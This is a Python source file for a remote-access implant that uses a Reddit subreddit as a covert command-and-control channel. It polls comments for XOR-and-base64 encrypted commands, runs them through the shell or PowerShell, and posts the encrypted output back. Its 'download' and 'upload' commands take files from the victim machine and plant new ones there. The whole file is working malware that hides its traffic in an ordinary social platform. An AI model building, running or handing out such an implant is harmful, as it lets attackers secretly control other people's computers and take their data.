import praw
import string
import time
import os
import json
import subprocess
import base64

#Function to convert base64 to file
def base64_to_file(base64_string, filename):
    # decode the base64 string
    decoded_data = base64.b64decode(base64_string).decode('utf-8')
    # write the data to the file
    with open(filename, 'wb') as f:
        f.write(decoded_data.encode())

#Function to encode a file to base64
def encode_file_in_base64(filepath):
    with open(filepath, 'rb') as file:
        file_data = file.read()
    return base64.b64encode(file_data).decode('utf-8')

#Function to xor encrypt a string
def xor_encrypt(plaintext, key):
    encrypted_text = ""
    for i in range(len(plaintext)):
        encrypted_text += chr(ord(plaintext[i]) ^ ord(key[i % len(key)]))
    return encrypted_text

#Function to base64 encode the string
def base64_encode(plaintext):
    return base64.b64encode(plaintext.encode())

#Function to encrypt the string
def encrypt(plaintext, key):
    encrypted_text = xor_encrypt(plaintext, key)
    return base64_encode(encrypted_text)

#Decryption

#Function to base64 decode the string
def base64_decode(encoded_text):
    return base64.b64decode(encoded_text).decode()

#Function to xor decrypt the string
def xor_decrypt(plaintext, key):
    decrypted_text = ""
    for i in range(len(plaintext)):
        decrypted_text += chr(ord(plaintext[i]) ^ ord(key[i % len(key)]))
    return decrypted_text

#Function to decrypt the string
def decrypt(encoded_text, key):
    decoded_text = base64_decode(encoded_text)
    return xor_decrypt(decoded_text, key)

#read a post with a specific title
def readTask(username, password, subreddit_name, listenerID):
    victim_responses = []
  
    subreddit = reddit.subreddit(subreddit_name)
    resp = subreddit.search(listenerID, limit=None)

    for submission in resp:        
        #look only for comments which has our command in it
        submission.comments.replace_more(limit=None)
        for top_level_comment in submission.comments:
            if("in:" in top_level_comment.body):
                victim_responses.append(top_level_comment.body)
        
    #use recursion when no new reply is found
    if not victim_responses:
        print("[!] No task received, waiting for 5 seconds")
        time.sleep(5)
        return readTask(username, password, subreddit_name, listenerID)
        
    #there is a task in the array, return it
    else:
        response = victim_responses[0]
        response = response[6:-1]
        
        #decryot the message
        ciphertext = decrypt(str(response), xor_key)
            
        if("powershell" in ciphertext):
           ciphertext = "powershell.exe " + ciphertext[11:]
         
        elif("run" in ciphertext):
            ciphertext = ciphertext[4:]
            
        print("[+] Received task to execute: " + ciphertext)
        return ciphertext

def sendOutput(command, output, username, password, subreddit_name, listenerID):
    subreddit = reddit.subreddit(subreddit_name)
    resp = subreddit.search(listenerID, limit=None)
    
    #encrypt the output which is about to be sent as a reply
    ciphertext = encrypt(output, xor_key)
    
    for submission in resp:
        submission.comments.replace_more(limit=None)
        for top_level_comment in submission.comments:
            if("in:" in top_level_comment.body):
                top_level_comment.reply("out: " + str(ciphertext))
                time.sleep(2)
                #edit the reply to executed (done in teamserver)
                #top_level_comment.edit("executed")
    
def runTask(command):
    output = subprocess.getoutput(command)
    return output

if __name__ == "__main__":
    #fill in the data with your credentials
    #-------------------------------------
    client_id = "myclientid"
    client_secret = "mysecretkey"
    username = "myusername"
    password = "mypassword"
    subreddit = "mysubreddit"
    listenerID = "listener_number"
    xor_key = "myxorkey"
    #-------------------------------------
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"

    # creating an authorized reddit instance
    reddit = praw.Reddit(client_id = client_id,
                     client_secret = client_secret,
                     username = username,
                     password = password,
                     user_agent = user_agent)
                     
    reddit.validate_on_submit = True

    while True:
        time.sleep(5)
        command = readTask(username, password, subreddit, listenerID)
        
        if(command[:8] == "download"):
            filename = command[9:] #save filename
            output = encode_file_in_base64(filename)
            if(len(output) > 10000):
                sendOutput(command, "[!] File is too large (" + str(len(output)) + "/10000 available characters)", username, password, subreddit, listenerID)
            else:
                sendOutput(command, output, username, password, subreddit, listenerID)
        
        elif(command[:6] == "upload"):
            base64_to_file(command.split()[2], command.split()[1])
            sendOutput(command, "[+] File uploaded successfully", username, password, subreddit, listenerID)
        
        else:
            output = runTask(command)
            sendOutput(command, output, username, password, subreddit, listenerID)
